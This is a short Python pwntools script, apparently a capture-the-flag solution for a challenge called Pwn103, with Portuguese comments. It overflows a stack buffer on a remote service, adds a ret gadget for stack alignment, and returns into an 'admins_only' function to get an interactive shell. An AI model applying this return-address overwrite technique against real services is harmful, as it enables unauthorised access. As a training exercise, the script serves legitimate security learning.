'''
Pwn103 - Sobrescrever o endereço de retorno (RET) | General() Functions | 
'''

from pwn import *

context.binary = binary = ELF("./pwn103.pwn103")

#p = process() # TESTE lOCAL, desativa o remote e ativa esse.

p = remote("IP AQUI", 9003)

p.sendline(b"3")

admins_only_adress = p64(binary.symbols.admins_only)

'''
Rescrevendo o endereço de retorno. 20 bytes + 8 bytes + RET
'''

ret_address = p64(0x00401377)  #BECOUSE OF MOVAPS ISSUE = EXTRA RET BEFORE RETURNING


payload = b"A"*0x20 + b"B"*0x8 + ret_address + admins_only_adress

p.sendline(payload)

p.interactive()